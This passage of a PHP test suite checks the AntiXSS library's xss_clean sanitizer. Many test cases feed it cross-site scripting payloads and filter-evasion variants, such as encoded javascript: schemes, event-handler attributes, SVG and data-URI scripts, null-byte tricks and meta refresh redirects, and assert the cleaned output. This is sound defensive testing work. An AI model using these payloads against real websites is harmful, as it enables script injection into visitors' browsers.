            'http://vulnerabledomain.com/xss.php?x=%3Csvg%3E%3Cuse%20height=200%20width=200%20xlink:href=%27http://vulnerabledomain.com/xss.php?x=%3Csvg%20id%3D%22rectangle%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20xmlns%3Axlink%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2Fxlink%22%20%20%20%20width%3D%22100%22%20height%3D%22100%22%3E%3Ca%20xlink%3Ahref%3D%22javascript%3Aalert%28location%29%22%3E%3Crect%20class%3D%22blue%22%20x%3D%220%22%20y%3D%220%22%20width%3D%22100%22%20height%3D%22100%22%20%2F%3E%3C%2Fa%3E%3C%2Fsvg%3E%23rectangle%27/%3E%3C/svg%3E'                  => 'http://vulnerabledomain.com/xss.php?x=&lt;svg&gt;<use height=200 width=200 />&lt;/svg&gt;',
            '<svg id="rectangle" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"width="100" height="100"><a xlink:href="javascript:alert(location)"><rect x="0" y="0" width="100" height="100" /></a></svg>'                                                                                                                                                                                                                                                                                                                                                             => '&lt;svg id="rectangle" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"width="100" height="100"&gt;<a href="(location)"><rect x="0" y="0" width="100" height="100" /></a>&lt;/svg&gt;',
            '<svg><use xlink:href="data:image/svg+xml;base64,PHN2ZyBpZD0icmVjdGFuZ2xlIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiAgICB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCI+PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg0KIDxmb3JlaWduT2JqZWN0IHdpZHRoPSIxMDAiIGhlaWdodD0iNTAiDQogICAgICAgICAgICAgICAgICAgcmVxdWlyZWRFeHRlbnNpb25zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIj4NCgk8ZW1iZWQgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGh0bWwiIHNyYz0iamF2YXNjcmlwdDphbGVydChsb2NhdGlvbikiIC8+DQogICAgPC9mb3JlaWduT2JqZWN0Pg0KPC9zdmc+#rectangle" /></svg>' => '&lt;svg&gt;<use  />&lt;/svg&gt;',
            '
            <!DOCTYPE html>
            <html onAttribute="bar">
            <body onload    =load"myFunction()" id="">
            
            <h1 onload="test" >Hello World!</h1>
            
            <script>
            function myFunction() {
                alert("Page is loaded");
            }
            </script>
            
            </body>
            </html>
            ' => '
            &lt;!DOCTYPE html>
            &lt;html &gt;
            &lt;body  id=""&gt;
            
            <h1  >Hello World!</h1>
            
            
            
            &lt;/body&gt;
            &lt;/html&gt;
            ',
        ];

        foreach ($testArray as $before => $after) {
            static::assertSame($after, (new AntiXSS())->xss_clean($before), 'testing: ' . $before);
        }
    }

    public function testJavaScriptCleaning()
    {
        // http://cpansearch.perl.org/src/KURIANJA/HTML-Defang-1.02/t/02_xss.t

        $testArray = [
            '<img FSCommand="someFunction()">',
            '<img onAbort="someFunction()">',
            '<img onActivate="someFunction()">',
            '<img onAfterPrint="someFunction()">',
            '<img onAfterUpdate="someFunction()">',
            '<img onBeforeActivate="someFunction()">',
            '<img onBeforeCopy="someFunction()">',
            '<img onBeforeCut="someFunction()">',
            '<img onBeforeDeactivate="someFunction()">',
            '<img onBeforeEditFocus="someFunction()">',
            '<img onBeforePaste="someFunction()">',
            '<img onBeforePrint="someFunction()">',
            '<img onBeforeUnload="someFunction()">',
            '<img onBegin="someFunction()">',
            '<img onBlur="someFunction()">',
            '<img onBounce="someFunction()">',
            '<img onCellChange="someFunction()">',
            '<img onChange="someFunction()">',
            '<img onClick="someFunction()">',
            '<img onContextMenu="someFunction()">',
            '<img onControlSelect="someFunction()">',
            '<img onCopy="someFunction()">',
            '<img onCut="someFunction()">',
            '<img onDataAvailable="someFunction()">',
            '<img onDataSetChanged="someFunction()">',
            '<img onDataSetComplete="someFunction()">',
            '<img onDblClick="someFunction()">',
            '<img onDeactivate="someFunction()">',
            '<img onDrag="someFunction()">',
            '<img onDragEnd="someFunction()">',
            '<img onDragLeave="someFunction()">',
            '<img onDragEnter="someFunction()">',
            '<img onDragOver="someFunction()">',
            '<img onDragDrop="someFunction()">',
            '<img onDrop="someFunction()">',
            '<img onEnd="someFunction()">',
            '<img onError="someFunction()">',
            '<img onErrorUpdate="someFunction()">',
            '<img onFilterChange="someFunction()">',
            '<img onFinish="someFunction()">',
            '<img onFocus="someFunction()">',
            '<img onFocusIn="someFunction()">',
            '<img onFocusOut="someFunction()">',
            '<img onHelp="someFunction()">',
            '<img onKeyDown="someFunction()">',
            '<img onKeyPress="someFunction()">',
            '<img onKeyUp="someFunction()">',
            '<img onLayoutComplete="someFunction()">',
            '<img onLoad="someFunction()">',
            '<img onLoseCapture="someFunction()">',
            '<img onMediaComplete="someFunction()">',
            '<img onMediaError="someFunction()">',
            '<img onMouseDown="someFunction()">',
            '<img onMouseEnter="someFunction()">',
            '<img onMouseLeave="someFunction()">',
            '<img onMouseMove="someFunction()">',
            '<img onMouseOut="someFunction()">',
            '<img onMouseOver="someFunction()">',
            '<img onMouseUp="someFunction()">',
            '<img onMouseWheel="someFunction()">',
            '<img onMove="someFunction()">',
            '<img onMoveEnd="someFunction()">',
            '<img onMoveStart="someFunction()">',
            '<img onOutOfSync="someFunction()">',
            '<img onPaste="someFunction()">',
            '<img onPause="someFunction()">',
            '<img onProgress="someFunction()">',
            '<img onPropertyChange="someFunction()">',
            '<img onReadyStateChange="someFunction()">',
            '<img onRepeat="someFunction()">',
            '<img onReset="someFunction()">',
            '<img onResize="someFunction()">',
            '<img onResizeEnd="someFunction()">',
            '<img onResizeStart="someFunction()">',
            '<img onResume="someFunction()">',
            '<img onReverse="someFunction()">',
            '<img onRowsEnter="someFunction()">',
            '<img onRowExit="someFunction()">',
            '<img onRowDelete="someFunction()">',
            '<img onRowInserted="someFunction()">',
            '<img onScroll="someFunction()">',
            '<img onSeek="someFunction()">',
            '<img onSelect="someFunction()">',
            '<img onSelectionChange="someFunction()">',
            '<img onSelectStart="someFunction()">',
            '<img onStart="someFunction()">',
            '<img onStop="someFunction()">',
            '<img onSyncRestored="someFunction()">',
            '<img onSubmit="someFunction()">',
            '<img onTimeError="someFunction()">',
            '<img onTrackChange="someFunction()">',
            '<img onUnload="someFunction()">',
            '<img onURLFlip="someFunction()">',
            '<img seekSegmentTime="someFunction()">',
        ];

        foreach ($testArray as $test) {
            static::assertSame('<img >', (new AntiXSS())->xss_clean($test));
        }

        $testString = 'http://www.buick.com/encore-luxury-small-crossover/build-your-own.html ?x-zipcode=\';\u006F\u006E\u0065rror=\u0063onfirm;throw\'XSSposed';
        $resultString = 'http://www.buick.com/encore-luxury-small-crossover/build-your-own.html ?x-zipcode=\';=confirm;throw\'XSSposed';
        static::assertSame($resultString, (new AntiXSS())->xss_clean($testString));

        $testString = '<img src="http://moelleken.org/test.png" alt="bar" title="foo">';
        static::assertSame('<img src="http://moelleken.org/test.png" alt="bar" title="foo">', (new AntiXSS())->xss_clean($testString));

        $testString = '<img src=www.example.com/smiley.gif >';
        static::assertSame('<img  >', (new AntiXSS())->xss_clean($testString));

        $testString = '<img src="www.example.com/smiley.gif" >';
        static::assertSame('<img src="www.example.com/smiley.gif" >', (new AntiXSS())->xss_clean($testString));

        $testString = '<img src=\'www.example.com/smiley.gif\' >';
        static::assertSame('<img src=\'www.example.com/smiley.gif\' >', (new AntiXSS())->xss_clean($testString));

        $testString = '<img src="http://moelleken.org/test.png" alt="bar" title="javascript:alert(\'XSS\');">';
        static::assertSame('<img src="http://moelleken.org/test.png" alt="bar" title="(\'XSS\');">', (new AntiXSS())->xss_clean($testString));

        $testString = '<img src="<?php echo "http://moelleken.org/test.png" ?>" alt="bar" title="foo">';
        static::assertSame('<img src="">" alt="bar" title="foo">', (new AntiXSS())->xss_clean($testString));

        $testString = '<img src="<?php echo "http://moelleken.org/test.png" ?>" alt="bar" title="javascript:alert(\'XSS\');">';
        static::assertSame('<img src="">" alt="bar" title="(\'XSS\');">', (new AntiXSS())->xss_clean($testString));

        $testString = '<img/src/onerror=alert(1)>';
        static::assertSame('<img/>', (new AntiXSS())->xss_clean($testString));
    }

    public function testXssUrlDecode()
    {
        $testArray = [
            '<scri + pt>'     => '',
            '<scri   pt>'     => '',
            '<scri\'   \'pt>' => '',
            '<scri\' + \'pt>' => '',
        ];

        foreach ($testArray as $before => $after) {
            static::assertSame($after, (new AntiXSS())->xss_clean($before), $before);
        }
    }

    public function testXssCleanEntityDoubleEncoded()
    {
        $testArray = [
            '<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>'                                                                                                                                                                                                    => '<IMG >',
            '<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>'                                                                                                                                                                                                                                                                                                => '<IMG >',
            "<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">"                                                                                                                                                                                                                                                                                                                                                                                 => '<IMG SRC="(\'XSS\');">',
            '<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>'                                                                                                                                                                                                                                                                                     => '<IMG >',
            '<a href="&#38&#35&#49&#48&#54&#38&#35&#57&#55&#38&#35&#49&#49&#56&#38&#35&#57&#55&#38&#35&#49&#49&#53&#38&#35&#57&#57&#38&#35&#49&#49&#52&#38&#35&#49&#48&#53&#38&#35&#49&#49&#50&#38&#35&#49&#49&#54&#38&#35&#53&#56&#38&#35&#57&#57&#38&#35&#49&#49&#49&#38&#35&#49&#49&#48&#38&#35&#49&#48&#50&#38&#35&#49&#48&#53&#38&#35&#49&#49&#52&#38&#35&#49&#48&#57&#38&#35&#52&#48&#38&#35&#52&#57&#38&#35&#52&#49">Clickhere</a>' => '<a href="(1)">Clickhere</a>',
            '<a href="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">Google</a>'                                                                                                                                                                                                                                                                                                                                                       => '<a href="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">Google</a>', // no-xss (http://www.google.com)
        ];

        foreach ($testArray as $before => $after) {
            static::assertSame($after, (new AntiXSS())->xss_clean($before), $before);
        }
    }

    public function testXssCleanJsImgRemoval()
    {
        $input = '<img src="&#38&#35&#49&#48&#54&#38&#35&#57&#55&#38&#35&#49&#49&#56&#38&#35&#57&#55&#38&#35&#49&#49&#53&#38&#35&#57&#57&#38&#35&#49&#49&#52&#38&#35&#49&#48&#53&#38&#35&#49&#49&#50&#38&#35&#49&#49&#54&#38&#35&#53&#56&#38&#35&#57&#57&#38&#35&#49&#49&#49&#38&#35&#49&#49&#48&#38&#35&#49&#48&#50&#38&#35&#49&#48&#53&#38&#35&#49&#49&#52&#38&#35&#49&#48&#57&#38&#35&#52&#48&#38&#35&#52&#57&#38&#35&#52&#49">Clickhere';
        static::assertSame('<img src="(1)">Clickhere', (new AntiXSS())->xss_clean($input), $input);
    }

    public function testXssCleanJsARemoval()
    {
        $input = '<a src="&#38&#35&#49&#48&#54&#38&#35&#57&#55&#38&#35&#49&#49&#56&#38&#35&#57&#55&#38&#35&#49&#49&#53&#38&#35&#57&#57&#38&#35&#49&#49&#52&#38&#35&#49&#48&#53&#38&#35&#49&#49&#50&#38&#35&#49&#49&#54&#38&#35&#53&#56&#38&#35&#57&#57&#38&#35&#49&#49&#49&#38&#35&#49&#49&#48&#38&#35&#49&#48&#50&#38&#35&#49&#48&#53&#38&#35&#49&#49&#52&#38&#35&#49&#48&#57&#38&#35&#52&#48&#38&#35&#52&#57&#38&#35&#52&#49">Clickhere';
        static::assertSame('<a src="(1)">Clickhere', (new AntiXSS())->xss_clean($input), $input);
    }

    public function testXssCleanJsDivRemoval()
    {
        $input = '<div test="&#38&#35&#49&#48&#54&#38&#35&#57&#55&#38&#35&#49&#49&#56&#38&#35&#57&#55&#38&#35&#49&#49&#53&#38&#35&#57&#57&#38&#35&#49&#49&#52&#38&#35&#49&#48&#53&#38&#35&#49&#49&#50&#38&#35&#49&#49&#54&#38&#35&#53&#56&#38&#35&#57&#57&#38&#35&#49&#49&#49&#38&#35&#49&#49&#48&#38&#35&#49&#48&#50&#38&#35&#49&#48&#53&#38&#35&#49&#49&#52&#38&#35&#49&#48&#57&#38&#35&#52&#48&#38&#35&#52&#57&#38&#35&#52&#49">Clickhere';
        static::assertSame('<div test="(1)">Clickhere', (new AntiXSS())->xss_clean($input), $input);

        $input = '<div test="&#38&#35&#49&#48&#54&#38&#35&#57&#55&#38&#35&#49&#49&#56&#38&#35&#57&#55&#38&#35&#49&#49&#53&#38&#35&#57&#57&#38&#35&#49&#49&#52&#38&#35&#49&#48&#53&#38&#35&#49&#49&#50&#38&#35&#49&#49&#54&#38&#35&#53&#56&#38&#35&#57&#57&#38&#35&#49&#49&#49&#38&#35&#49&#49&#48&#38&#35&#49&#48&#50&#38&#35&#49&#48&#53&#38&#35&#49&#49&#52&#38&#35&#49&#48&#57&#38&#35&#52&#48&#38&#35&#52&#57&#38&#35&#52&#49">Clickhere</div>';
        static::assertSame('<div test="(1)">Clickhere</div>', (new AntiXSS())->xss_clean($input), $input);

        $input = '<div onClick="&#38&#35&#49&#48&#54&#38&#35&#57&#55&#38&#35&#49&#49&#56&#38&#35&#57&#55&#38&#35&#49&#49&#53&#38&#35&#57&#57&#38&#35&#49&#49&#52&#38&#35&#49&#48&#53&#38&#35&#49&#49&#50&#38&#35&#49&#49&#54&#38&#35&#53&#56&#38&#35&#57&#57&#38&#35&#49&#49&#49&#38&#35&#49&#49&#48&#38&#35&#49&#48&#50&#38&#35&#49&#48&#53&#38&#35&#49&#49&#52&#38&#35&#49&#48&#57&#38&#35&#52&#48&#38&#35&#52&#57&#38&#35&#52&#49">Clickhere</div>';
        static::assertSame('<div >Clickhere</div>', (new AntiXSS())->xss_clean($input), $input);

        $input = '<div onClick="&#38&#35&#49&#48&#54&#38&#35&#57&#55&#38&#35&#49&#49&#56&#38&#35&#57&#55&#38&#35&#49&#49&#53&#38&#35&#57&#57&#38&#35&#49&#49&#52&#38&#35&#49&#48&#53&#38&#35&#49&#49&#50&#38&#35&#49&#49&#54&#38&#35&#53&#56&#38&#35&#57&#57&#38&#35&#49&#49&#49&#38&#35&#49&#49&#48&#38&#35&#49&#48&#50&#38&#35&#49&#48&#53&#38&#35&#49&#49&#52&#38&#35&#49&#48&#57&#38&#35&#52&#48&#38&#35&#52&#57&#38&#35&#52&#49">Clickhere';
        static::assertSame('<div >Clickhere', (new AntiXSS())->xss_clean($input), $input);

        $input = '<div onClick=&#38&#35&#49&#48&#54&#38&#35&#57&#55&#38&#35&#49&#49&#56&#38&#35&#57&#55&#38&#35&#49&#49&#53&#38&#35&#57&#57&#38&#35&#49&#49&#52&#38&#35&#49&#48&#53&#38&#35&#49&#49&#50&#38&#35&#49&#49&#54&#38&#35&#53&#56&#38&#35&#57&#57&#38&#35&#49&#49&#49&#38&#35&#49&#49&#48&#38&#35&#49&#48&#50&#38&#35&#49&#48&#53&#38&#35&#49&#49&#52&#38&#35&#49&#48&#57&#38&#35&#52&#48&#38&#35&#52&#57&#38&#35&#52&#49>Clickhere';
        static::assertSame('<div >Clickhere', (new AntiXSS())->xss_clean($input), $input);
    }

    public function testNaughtyHtmlPlusEvilAttributes()
    {
        static::assertSame('&lt;svg<img > src="x">', (new AntiXSS())->xss_clean('<svg<img > src="x" onerror="location=/javascript/.source+/:alert/.source+/(1)/.source">'));
    }

    public function testXssCleanSanitizeNaughtyHtml()
    {
        static::assertSame('&lt;unclosedTag', (new AntiXSS())->xss_clean('<unclosedTag'));
        static::assertSame('&lt;blink&gt;', (new AntiXSS())->xss_clean('<blink>'));
        static::assertSame('<fubar>', (new AntiXSS())->xss_clean('<fubar>'));
        static::assertSame('<img &svg="" src="x">', (new AntiXSS())->xss_clean('<img <svg=""> src="x">'));
        static::assertSame('<img src="b on=">on=">"x ="alert&#40;1&#41;">', (new AntiXSS())->xss_clean('<img src="b on="<x">on=">"x onerror="alert(1)">'));
    }

    public function testXssCleanSanitizeNaughtyHtmlAttributes()
    {
        static::assertSame('="bar"', (new AntiXSS())->xss_clean('onAttribute="bar"'));
        static::assertSame('<foo >', (new AntiXSS())->xss_clean('<foo onAttribute="bar">'));
        static::assertSame('<foo >', (new AntiXSS())->xss_clean('<foo onAttributeNoQuotes=bar>'));
        static::assertSame('<foo >', (new AntiXSS())->xss_clean('<foo onAttributeWithSpaces = bar>'));
        static::assertSame('<foo prefixOnAttribute="bar">', (new AntiXSS())->xss_clean('<foo prefixOnAttribute="bar">'));
        static::assertSame('<foo>onOutsideOfTag=test</foo>', (new AntiXSS())->xss_clean('<foo>onOutsideOfTag=test</foo>'));
        static::assertSame('onNoTagAtAll = true', (new AntiXSS())->xss_clean('onNoTagAtAll = true'));
        static::assertSame('<foo bar=">" baz=\'>\' onAfterGreaterThan="quotes">', (new AntiXSS())->xss_clean('<foo bar=">" baz=\'>\' onAfterGreaterThan="quotes">'));
        static::assertSame('<foo bar=">" baz=\'>\' onAfterGreaterThan=noQuotes>', (new AntiXSS())->xss_clean('<foo bar=">" baz=\'>\' onAfterGreaterThan=noQuotes>'));
        static::assertSame('<img src="x" on=""> on=&lt;svg&gt; =alert&#40;1&#41;>', (new AntiXSS())->xss_clean('<img src="x" on=""> on=<svg> onerror=alert(1)>'));
        static::assertSame('<img src="on=\'">"&lt;svg&gt; =alert&#40;1&#41; =alert&#40;1&#41;>', (new AntiXSS())->xss_clean('<img src="on=\'">"<svg> onerror=alert(1) onmouseover=alert(1)>'));
        static::assertSame('<img src="x"> on=\'x\' =``,alert&#40;1&#41;>', (new AntiXSS())->xss_clean('<img src="x"> on=\'x\' onerror=``,alert(1)>'));
        static::assertSame('<img src="x"> on=\'x\' ononerror=error=``,alert&#40;1&#41;>', (new AntiXSS())->xss_clean('<img src="x"> on=\'x\' ononerror=error=``,alert(1)>'));
        static::assertSame('<img src="0" width="0" alt="src=" />', (new AntiXSS())->xss_clean('<img src="0" width="0" alt="src=&quot;src=0 width=0 onerror=alert(unescape(/dang%20quotes!/.source))//\" />'));
        static::assertSame('<a&lt; >', (new AntiXSS())->xss_clean('<a< onmouseover="alert(1)">'));
        static::assertSame('<img src="x"> on=\'x\' =,xssm()>', (new AntiXSS())->xss_clean('<img src="x"> on=\'x\' onerror=,xssm()>'));
        static::assertSame('<image src="&lt;&gt;" >', (new AntiXSS())->xss_clean('<image src="<>" onerror=\'alert(1)\'>'));
        static::assertSame('<b "=&lt;= >', (new AntiXSS())->xss_clean('<b "=<= onmouseover=alert(1)>'));
        static::assertSame('<b a=&lt;=" >', (new AntiXSS())->xss_clean('<b a=<=" onmouseover="alert(1),1>1">'));
        static::assertSame('<b "="&lt; x=" =alert&#40;1&#41;//">', (new AntiXSS())->xss_clean('<b "="< x=" onmouseover=alert(1)//">'));
        static::assertSame('&lt;meta http-equiv="refresh" content="0;url=;"&gt;', (new AntiXSS())->xss_clean('<meta http-equiv="refresh" content="0;url=javascript:document.vulnerable=true;">'));
        static::assertSame('&lt;&gt;&lt;&lt;meta &lt;meta http-equiv="refresh" content="5; URL=https://foo.bar?hacked=1/"&gt;', (new AntiXSS())->xss_clean('<><<meta <meta http-equiv="refresh" content="5; URL=https://foo.bar?hacked=1/">'));
        static::assertSame('-->&lt;!-- --\x3E> <img > --&gt;', (new AntiXSS())->xss_clean('--><!-- --\x3E> <img src=xxx:x onerror=javascript:alert(1)> -->'));
    }

    /**
     * all tests from drupal
     */
    public function testXss()
    {
        $cases = [
            // Tag stripping, different ways to work around removal of HTML tags.
            [
                '<script>alert(0)</script>',
                '',
                'script',
                'HTML tag stripping -- simple script without special characters.',
            ],
            [
                '<script src="http://www.example.com" />',
                '',
                'script',
                'HTML tag stripping -- empty script with source.',
            ],
            [
                '<ScRipt sRc=http://www.example.com/>',
                '',
                'script',
                'HTML tag stripping evasion -- varying case.',
            ],
            [
                "<script\nsrc\n=\nhttp://www.example.com/\n>",
                '',
                'script',
                'HTML tag stripping evasion -- multiline tag.',
            ],
            [
                '<script/a src=http://www.example.com/a.js></script>',
                '',
                'script',
                'HTML tag stripping evasion -- non whitespace character after tag name.',
            ],
            [
                '<script/src=http://www.example.com/a.js></script>',
                '',
                'script',
                'HTML tag stripping evasion -- no space between tag and attribute.',
            ],
            // Null between < and tag name works at least with IE6.
            [
                "<\0scr\0ipt>alert(0)</script>",
                '',
                'ipt',
                'HTML tag stripping evasion -- breaking HTML with nulls.',
            ],
            [
                '<scrscriptipt src=http://www.example.com/a.js>',
                '<scrscriptipt src=http://www.example.com/a.js>',
                'script',
                'HTML tag stripping evasion -- filter just removing "script".',
            ],
            [
                '<<script>alert(0);//<</script>',
                '',
                'script',
                'HTML tag stripping evasion -- double opening brackets.',
            ],
            [
                '< <script >alert(0);//<</ script >',
                '',
                'script',
                'HTML tag stripping evasion -- double opening brackets.',
            ],
            [
                '< <script< >alert(0);//<</ script >',
                '',
                'script',
                'HTML tag stripping evasion -- double opening brackets.',
            ],
            [
                '< $2.20< <script< >alert(0);//<</ script >',
                '&lt; $2.20&lt; ',
                'script',
                'HTML tag stripping evasion -- double opening brackets + x.',
            ],
            [
                '<script src=http://www.example.com/a.js?<b>',
                '',
                'script',
                'HTML tag stripping evasion -- no closing tag.',
            ],
            // DRUPAL-SA-2008-047: This doesn't seem exploitable, but the filter should
            // work consistently.
            [
                '<script>>',
                '',
                'script',
                'HTML tag stripping evasion -- double closing tag.',
            ],
            [
                '<script src=//www.example.com/.a>',
                '',
                'script',
                'HTML tag stripping evasion -- no scheme or ending slash.',
            ],
            [
                '<script src=http://www.example.com/.a',
                '',
                'script',
                'HTML tag stripping evasion -- no closing bracket.',
            ],
            [
                '<script src=http://www.example.com/ <',
                '',
                'script',
                'HTML tag stripping evasion -- opening instead of closing bracket.',
            ],
            [
                '<nosuchtag attribute="newScriptInjectionVector">',
                '<nosuchtag attribute="newScriptInjectionVector">',
                'nosuchtag',
                'HTML tag stripping evasion -- unknown tag.',
            ],
            [
                '<t:set attributeName="innerHTML" to="&lt;script defer&gt;alert(0)&lt;/script&gt;">',
                '<t:set attributeName="innerHTML" to="alert&#40;0&#41;">',
                't:set',
                'HTML tag stripping evasion -- colon in the tag name (namespaces\' tricks).',
            ],
            [
                '<img """><script>alert(0)</script>',
                '<img """>',
                'script',
                'HTML tag stripping evasion -- a malformed image tag.',
                ['img'],
            ],
            [
                '<blockquote><script>alert(0)</script></blockquote>',
                '<blockquote></blockquote>',
                'script',
                'HTML tag stripping evasion -- script in a blockqoute.',
                ['blockquote'],
            ],
            [
                '<!--[if true]><script>alert(0)</script><![endif]-->',
                '&lt;!--[if true]><![endif]--&gt;',
                'script',
                'HTML tag stripping evasion -- script within a comment.',
            ],
            // Dangerous attributes removal.
            [
                '<p onmouseover="http://www.example.com/">',
                '<p >',
                'onmouseover',
                'HTML filter attributes removal -- events, no evasion.',
                ['p'],
            ],
            [
                '<li style="list-style-image: url(javascript:alert(0))">',
                '<li >',
                'style',
                'HTML filter attributes removal -- style, no evasion.',
                ['li'],
            ],
            [
                '<img onerror   =alert(0)>',
                '<img >',
                'onerror',
                'HTML filter attributes removal evasion -- spaces before equals sign.',
                ['img'],
            ],
            [
                '<img onabort!#$%&()*~+-_.,:;?@[/|\]^`=alert(0)>',
                '<img >',
                'onabort',
                'HTML filter attributes removal evasion -- non alphanumeric characters before equals sign.',
                ['img'],
            ],
            [
                '<img oNmediAError=alert(0)>',
                '<img >',
                'onmediaerror',
                'HTML filter attributes removal evasion -- varying case.',
                ['img'],
            ],
            // Works at least with IE6.
            [
                "<img o\0nfocus\0=alert(0)>",
                '<img >',
                'focus',
                'HTML filter attributes removal evasion -- breaking with nulls.',
                ['img'],
            ],
            // Only whitelisted scheme names allowed in attributes.
            [
                '<img src="javascript:alert(0)">',
                '<img src="(0)">',
                'javascript',
                'HTML scheme clearing -- no evasion.',
                ['img'],
            ],
            [
                '<img src=javascript:alert(0)>',
                '<img >',
                'javascript',
                'HTML scheme clearing evasion -- no quotes.',
                ['img'],
            ],
            // A bit like CVE-2006-0070.
            [
                '<img src="javascript:confirm(0)">',
                '<img src="(0)">',
                'javascript',
                'HTML scheme clearing evasion -- no alert ;)',
                ['img'],
            ],
            [
                '<img src=`javascript:alert(0)`>',
                '<img >',
                'javascript',
                'HTML scheme clearing evasion -- grave accents.',
                ['img'],
            ],
            [
                '<img dynsrc="javascript:alert(0)">',
                '<img dynsrc="(0)">',
                'javascript',
                'HTML scheme clearing -- rare attribute.',
                ['img'],
            ],
            [
                '<table background="javascript:alert(0)">',
                '<table background="(0)">',
                'javascript',
                'HTML scheme clearing -- another tag.',
                ['table'],
            ],
            [
                '<base href="javascript:alert(0);//">',
                '&lt;base href="(0);//"&gt;',
                'javascript',
                'HTML scheme clearing -- one more attribute and tag.',
                ['base'],
            ],
            [
                '<img src="jaVaSCriPt:alert(0)">',
                '<img src="(0)">',
                'javascript',
                'HTML scheme clearing evasion -- varying case.',
                ['img'],
            ],
            [
                '<img src=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#48;&#41;>',
                '<img >',
                'javascript',
                'HTML scheme clearing evasion -- UTF-8 decimal encoding.',
                ['img'],
            ],
            [
                '<img src=&#00000106&#0000097&#00000118&#0000097&#00000115&#0000099&#00000114&#00000105&#00000112&#00000116&#0000058&#0000097&#00000108&#00000101&#00000114&#00000116&#0000040&#0000048&#0000041>',
                '<img >',
                'javascript',
                'HTML scheme clearing evasion -- long UTF-8 encoding.',
                ['img'],
            ],
            [
                '<img src=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x30&#x29>',
                '<img >',
                'javascript',
                'HTML scheme clearing evasion -- UTF-8 hex encoding.',
                ['img'],
            ],
            [
                "<img src=\"jav\tascript:alert(0)\">",
                '<img src="(0)">',
                'script',
                'HTML scheme clearing evasion -- an embedded tab.',
                ['img'],
            ],
            [
                '<img src="jav&#x09;ascript:alert(0)">',
                '<img src="(0)">',
                'script',
                'HTML scheme clearing evasion -- an encoded, embedded tab.',
                ['img'],
            ],
            [
                '<img src="jav&#x000000A;ascript:alert(0)">',
                '<img src="(0)">',
                'script',
                'HTML scheme clearing evasion -- an encoded, embedded newline.',
                ['img'],
            ],
            [
                "<img src=\"\n\n\nj\na\nva\ns\ncript:alert(0)\">",
                '<img src="


(0)">',
                'cript',
                'HTML scheme clearing evasion -- broken into many lines.',
                ['img'],
            ],
            [
                "<img src=\"jav\0a\0\0cript:alert(0)\">",
                '<img src="">',
                'cript',
                'HTML scheme clearing evasion -- embedded nulls.',
                ['img'],
            ],
            [
                '<img src="vbscript:msgbox(0)">',
                '<img src="(0)">',
                'vbscript',
                'HTML scheme clearing evasion -- another scheme.',
                ['img'],
            ],
            [
                '<img src="nosuchscheme:notice(0)">',
                '<img src="nosuchscheme:notice(0)">',
                'nosuchscheme',
                'HTML scheme clearing evasion -- unknown scheme.',
                ['img'],
            ],
            // DRUPAL-SA-2008-006: Invalid UTF-8, these only work as reflected XSS with
            // Internet Explorer 6.
            [
                "<p arg=\"\xe0\">\" style=\"background-image: url(j\xe0avas\xc2\xa0cript:alert(0));\"\xe0<p>",
                '<p arg="">" style="background-image: url((0));"<p>',
                'style',
                'HTML filter -- invalid UTF-8.',
                ['p'],
            ],
            [
                '<img src=" &#14;  javascript:alert(0)">',
                '<img src=" &#14;  (0)">',
                'javascript',
                'HTML scheme clearing evasion -- spaces and metacharacters before scheme.',
                ['img'],
            ],
        ];

        foreach ($cases as $caseArray) {
            static::assertSame($caseArray[1], (new AntiXSS())->xss_clean($caseArray[0]), 'error by: ' . $caseArray[0]);
        }
    }

    public function testEscapedHtmlInsidePreTags()
    {
        $content = '
            <pre><code>
                $foo  = "&lt;p class=\"foo\"&gt;bar&lt;/p&gt;";
            </code></pre>
        ';

        static::assertSame($content, (new AntiXSS())->xss_clean($content));

        // --

        $content = '
            <pre><code>
                &lt;script&gt;
                    foo();
                &lt;/script&gt;
            </code></pre>
        ';

        $expected = '
            <pre><code>
                
                    foo();
                
            </code></pre>
        ';

        static::assertSame($expected, (new AntiXSS())->xss_clean($content));
    }

    /**
     * Call protected/private method of a class.
     *
     * @param object &$object    Instantiated object that we will run method on
     * @param string $methodName Method name to call
     * @param array  $parameters array of parameters to pass into method
     *
     * @return mixed method return
     */
    public function invokeMethod(&$object, $methodName, array $parameters = [])
    {
        $reflection = new \ReflectionObject($object);
        $method = $reflection->getMethod($methodName);
        $method->setAccessible(true);

        return $method->invokeArgs($object, $parameters);
    }

    /**
     * Call protected/private method of a class.
     *
     * @param object &$object      Instantiated object that we will run method on
     * @param string $propertyName Property name
     *
     * @return mixed method return
     */
    public function invokeProperty(&$object, $propertyName)
    {
        $reflection = new \ReflectionObject($object);
        $property = $reflection->getProperty($propertyName);
        $property->setAccessible(true);

        return $property->getValue($object);
    }
}
